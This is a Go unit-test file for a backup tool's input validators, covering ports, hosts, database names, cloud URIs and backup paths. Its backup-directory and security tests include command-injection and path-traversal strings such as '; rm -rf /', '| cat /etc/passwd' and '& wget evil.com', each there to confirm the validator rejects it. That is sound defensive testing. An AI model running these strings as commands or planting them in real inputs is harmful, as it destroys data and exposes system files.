package validation

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

// =============================================================================
// Jobs Parameter Tests
// =============================================================================

func TestValidateJobs(t *testing.T) {
	tests := []struct {
		name    string
		jobs    int
		wantErr bool
	}{
		{"zero", 0, true},
		{"negative", -5, true},
		{"one", 1, false},
		{"typical", 4, false},
		{"high", 32, false},
		{"cpu_count", runtime.NumCPU(), false},
		{"double_cpu", runtime.NumCPU() * 2, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateJobs(tt.jobs)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateJobs(%d) error = %v, wantErr %v", tt.jobs, err, tt.wantErr)
			}
		})
	}
}

func TestValidateJobs_ErrorMessage(t *testing.T) {
	err := ValidateJobs(0)
	if err == nil {
		t.Fatal("expected error for jobs=0")
	}

	valErr, ok := err.(*ValidationError)
	if !ok {
		t.Fatalf("expected ValidationError, got %T", err)
	}

	if valErr.Field != "jobs" {
		t.Errorf("expected field 'jobs', got %q", valErr.Field)
	}
	if valErr.Value != "0" {
		t.Errorf("expected value '0', got %q", valErr.Value)
	}
}

// =============================================================================
// Retention Days Tests
// =============================================================================

func TestValidateRetentionDays(t *testing.T) {
	tests := []struct {
		name    string
		days    int
		wantErr bool
	}{
		{"negative", -1, true},
		{"zero_disabled", 0, false},
		{"typical", 30, false},
		{"one_year", 365, false},
		{"ten_years", 3650, false},
		{"over_ten_years", 3651, true},
		{"huge", 9999999, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateRetentionDays(tt.days)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateRetentionDays(%d) error = %v, wantErr %v", tt.days, err, tt.wantErr)
			}
		})
	}
}

// =============================================================================
// Compression Level Tests
// =============================================================================

func TestValidateCompressionLevel(t *testing.T) {
	tests := []struct {
		name    string
		level   int
		wantErr bool
	}{
		{"negative", -1, true},
		{"zero_none", 0, false},
		{"typical", 6, false},
		{"max", 9, false},
		{"over_max", 10, true},
		{"way_over", 100, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateCompressionLevel(tt.level)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateCompressionLevel(%d) error = %v, wantErr %v", tt.level, err, tt.wantErr)
			}
		})
	}
}

// =============================================================================
// Timeout Tests
// =============================================================================

func TestValidateTimeout(t *testing.T) {
	tests := []struct {
		name    string
		timeout int
		wantErr bool
	}{
		{"negative", -1, true},
		{"zero_infinite", 0, false},
		{"one_second", 1, false},
		{"one_hour", 3600, false},
		{"one_day", 86400, false},
		{"seven_days", 604800, false},
		{"over_seven_days", 604801, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateTimeout(tt.timeout)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateTimeout(%d) error = %v, wantErr %v", tt.timeout, err, tt.wantErr)
			}
		})
	}
}

// =============================================================================
// Port Tests
// =============================================================================

func TestValidatePort(t *testing.T) {
	tests := []struct {
		name    string
		port    int
		wantErr bool
	}{
		{"zero", 0, true},
		{"negative", -1, true},
		{"one", 1, false},
		{"postgres_default", 5432, false},
		{"mysql_default", 3306, false},
		{"max", 65535, false},
		{"over_max", 65536, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidatePort(tt.port)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidatePort(%d) error = %v, wantErr %v", tt.port, err, tt.wantErr)
			}
		})
	}
}

// =============================================================================
// Backup Directory Tests
// =============================================================================

func TestValidateBackupDir(t *testing.T) {
	tests := []struct {
		name    string
		path    string
		wantErr bool
	}{
		{"empty", "", true},
		{"root", "/", true},
		{"etc", "/etc", true},
		{"var", "/var", true},
		{"dev_null", "/dev", true},
		{"proc", "/proc", true},
		{"sys", "/sys", true},
		{"path_traversal_dotdot", "../etc", true},
		{"path_traversal_hidden", "/backups/../etc", true},
		{"tilde_expansion", "~/backups", true},
		{"variable_expansion", "$HOME/backups", true},
		{"command_injection_backtick", "`whoami`/backups", true},
		{"command_injection_pipe", "| rm -rf /", true},
		{"command_injection_semicolon", "; rm -rf /", true},
		{"command_injection_ampersand", "& rm -rf /", true},
		{"redirect_output", "> /etc/passwd", true},
		{"redirect_input", "< /etc/passwd", true},
		{"valid_tmp", "/tmp/backups", false},
		{"valid_absolute", "/data/backups", false},
		{"valid_nested", "/mnt/storage/db/backups", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateBackupDir(tt.path)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateBackupDir(%q) error = %v, wantErr %v", tt.path, err, tt.wantErr)
			}
		})
	}
}

func TestValidateBackupDir_LongPath(t *testing.T) {
	longPath := "/" + strings.Repeat("a", 4097)
	err := ValidateBackupDir(longPath)
	if err == nil {
		t.Error("expected error for path exceeding PATH_MAX")
	}
}

func TestValidateBackupDirExists(t *testing.T) {
	tmpDir, err := os.MkdirTemp("", "validation_test_*")
	if err != nil {
		t.Fatalf("failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tmpDir)

	err = ValidateBackupDirExists(tmpDir)
	if err != nil {
		t.Errorf("ValidateBackupDirExists failed for valid directory: %v", err)
	}

	err = ValidateBackupDirExists("/nonexistent/path/that/doesnt/exist")
	if err == nil {
		t.Error("expected error for non-existent directory")
	}

	testFile := filepath.Join(tmpDir, "testfile")
	if err := os.WriteFile(testFile, []byte("test"), 0644); err != nil {
		t.Fatalf("failed to create test file: %v", err)
	}
	err = ValidateBackupDirExists(testFile)
	if err == nil {
		t.Error("expected error for file instead of directory")
	}
}

// =============================================================================
// Database Name Tests
// =============================================================================

func TestValidateDatabaseName(t *testing.T) {
	tests := []struct {
		name    string
		dbName  string
		dbType  string
		wantErr bool
	}{
		{"empty", "", "postgres", true},
		{"simple", "mydb", "postgres", false},
		{"with_underscore", "my_db", "postgres", false},
		{"with_numbers", "db123", "postgres", false},
		{"with_hyphen", "my-db", "postgres", false},
		{"with_space", "my db", "postgres", false},
		{"with_quote", "my'db", "postgres", false},
		{"chinese", "生产数据库", "postgres", false},
		{"russian", "База_данных", "postgres", false},
		{"emoji", "💾_database", "postgres", false},
		{"reserved_select", "SELECT", "postgres", false},
		{"reserved_drop", "DROP", "postgres", false},
		{"null_byte", "test\x00db", "postgres", true},
		{"path_separator_forward", "test/db", "postgres", true},
		{"path_separator_back", "test\\db", "postgres", true},
		{"max_pg_length", strings.Repeat("a", 63), "postgres", false},
		{"over_pg_length", strings.Repeat("a", 64), "postgres", true},
		{"max_mysql_length", strings.Repeat("a", 64), "mysql", false},
		{"over_mysql_length", strings.Repeat("a", 65), "mysql", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateDatabaseName(tt.dbName, tt.dbType)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateDatabaseName(%q, %q) error = %v, wantErr %v", tt.dbName, tt.dbType, err, tt.wantErr)
			}
		})
	}
}

// =============================================================================
// Host Validation Tests
// =============================================================================

func TestValidateHost(t *testing.T) {
	tests := []struct {
		name    string
		host    string
		wantErr bool
	}{
		{"empty", "", true},
		{"localhost", "localhost", false},
		{"ipv4_loopback", "127.0.0.1", false},
		{"ipv4_private", "10.0.1.5", false},
		{"ipv6_loopback", "[::1]", false},
		{"ipv6_full", "[2001:db8::1]", false},
		{"ipv6_invalid_no_bracket", "::1", false},
		{"hostname_simple", "db", false},
		{"hostname_subdomain", "db.example.com", false},
		{"hostname_fqdn", "postgres.prod.us-east-1.example.com", false},
		{"hostname_too_long", strings.Repeat("a", 254), true},
		{"label_too_long", strings.Repeat("a", 64) + ".com", true},
		{"hostname_empty_label", "db..com", true},
		{"hostname_start_hyphen", "-db.com", true},
		{"hostname_end_hyphen", "db-.com", true},
		{"hostname_invalid_char", "db@host.com", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateHost(tt.host)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateHost(%q) error = %v, wantErr %v", tt.host, err, tt.wantErr)
			}
		})
	}
}

// =============================================================================
// Cloud URI Tests
// =============================================================================

func TestValidateCloudURI(t *testing.T) {
	tests := []struct {
		name    string
		uri     string
		wantErr bool
	}{
		{"empty_valid", "", false},
		{"s3_simple", "s3://mybucket/path", false},
		{"s3_bucket_only", "s3://mybucket", false},
		{"s3_with_slash", "s3://mybucket/", false},
		{"s3_nested", "s3://mybucket/deep/nested/path", false},
		{"azure", "azure://container/path", false},
		{"gcs", "gcs://mybucket/path", false},
		{"gs_alias", "gs://mybucket/path", false},
		{"file_local", "file:///local/path", false},
		{"http_invalid", "http://not-valid", true},
		{"https_invalid", "https://not-valid", true},
		{"ftp_invalid", "ftp://server/path", true},
		{"path_traversal", "s3://mybucket/../escape", true},
		{"s3_bucket_too_short", "s3://ab/path", true},
		{"s3_bucket_too_long", "s3://" + strings.Repeat("a", 64) + "/path", true},
		{"s3_bucket_uppercase", "s3://MyBucket/path", true},
		{"s3_bucket_starts_hyphen", "s3://-bucket/path", true},
		{"s3_bucket_ends_hyphen", "s3://bucket-/path", true},
		{"s3_double_hyphen", "s3://my--bucket/path", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateCloudURI(tt.uri)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateCloudURI(%q) error = %v, wantErr %v", tt.uri, err, tt.wantErr)
			}
		})
	}
}

// =============================================================================
// Combined Validation Tests
// =============================================================================

func TestValidateAll(t *testing.T) {
	v := ValidateAll(
		4,
		30,
		6,
		3600,
		5432,
		"/tmp/backups",
		"localhost",
		"mydb",
		"postgres",
		"",
	)
	if v.HasErrors() {
		t.Errorf("valid configuration should not have errors: %v", v.Error())
	}

	v = ValidateAll(
		0,
		-1,
		10,
		-1,
		0,
		"",
		"",
		"",
		"postgres",
		"http://invalid",
	)
	if !v.HasErrors() {
		t.Error("invalid configuration should have errors")
	}
	if len(v.Errors) < 5 {
		t.Errorf("expected multiple errors, got %d", len(v.Errors))
	}
}

// =============================================================================
// Security Edge Cases
// =============================================================================

func TestPathTraversalAttacks(t *testing.T) {
	attacks := []string{
		"../",
		"..\\",
		"/backups/../../../etc/passwd",
		"/backups/....//....//etc",
	}

	for _, attack := range attacks {
		err := ValidateBackupDir(attack)
		if err == nil {
			t.Errorf("path traversal attack should be rejected: %q", attack)
		}
	}
}

func TestCommandInjectionAttacks(t *testing.T) {
	attacks := []string{
		"; rm -rf /",
		"| cat /etc/passwd",
		"$(whoami)",
		"`whoami`",
		"& wget evil.com",
		"> /etc/passwd",
		"< /dev/null",
	}

	for _, attack := range attacks {
		err := ValidateBackupDir("/backups/" + attack)
		if err == nil {
			t.Errorf("command injection attack should be rejected: %q", attack)
		}
	}
}
